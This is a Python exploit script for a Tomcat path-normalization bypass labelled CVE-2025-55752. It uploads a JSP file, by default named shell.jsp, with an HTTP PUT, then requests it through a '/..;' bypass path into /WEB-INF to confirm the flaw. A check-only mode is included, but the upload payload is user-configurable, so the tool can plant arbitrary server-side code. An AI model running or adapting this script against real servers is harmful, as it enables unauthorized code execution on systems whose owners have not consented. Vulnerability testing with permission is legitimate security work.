import requests
import argparse
import urllib3
import sys
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = """
CVE-2025-55752 Tomcat Path Bypass & Upload Detection Script
============================================================
This tool attempts to exploit a Rewrite Valve + normalization bypass to upload a test JSP file 
into a protected location (like /WEB-INF) and verify if the server is vulnerable to CVE-2025-55752.
"""

def attempt_put_upload(target, filename, payload, verify_ssl):
    upload_path = f"/{filename}"
    url = f"{target}{upload_path}"
    try:
        print(f"[+] Attempting to upload payload to: {url}")
        response = requests.put(url, data=payload, verify=verify_ssl, timeout=10)
        if response.status_code in [200, 201, 204]:
            print(f"[+] Upload successful! Response code: {response.status_code}")
            return upload_path
        else:
            print(f"[-] Upload failed! Response code: {response.status_code}")
            return None
    except Exception as e:
        print(f"[!] Upload error: {e}")
        return None

def check_access(target, path, verify_ssl):
    bypass_path = f"/..;{path}"
    url = f"{target}{bypass_path}"
    try:
        print(f"[+] Checking access to: {url}")
        response = requests.get(url, verify=verify_ssl, timeout=10)
        if response.status_code == 200:
            print("[+] Bypass successful! Target may be vulnerable.")
            return True
        else:
            print(f"[-] Access denied or not vulnerable (HTTP {response.status_code}).")
            return False
    except Exception as e:
        print(f"[!] Access check error: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-55752 Exploit & Detection Tool")
    parser.add_argument("url", help="Target base URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--filename", default="shell.jsp", help="Filename to upload (default: shell.jsp)")
    parser.add_argument("--payload", default="<% out.println(\"Bypassed!\"); %>", help="Payload content to upload")
    parser.add_argument("--check", action="store_true", help="Only check for path bypass without uploading")
    parser.add_argument("--no-ssl-verify", action="store_true", help="Disable SSL certificate verification")
    args = parser.parse_args()

    print(BANNER)
    verify_ssl = not args.no_ssl_verify

    if not args.url.startswith("http"):
        print("[-] Please include http:// or https:// in the URL")
        sys.exit(1)

    if args.check:
        check_access(args.url, f"/WEB-INF/{args.filename}", verify_ssl)
    else:
        uploaded_path = attempt_put_upload(args.url, args.filename, args.payload, verify_ssl)
        if uploaded_path:
            check_access(args.url, f"/WEB-INF/{args.filename}", verify_ssl)

if __name__ == "__main__":
    main()
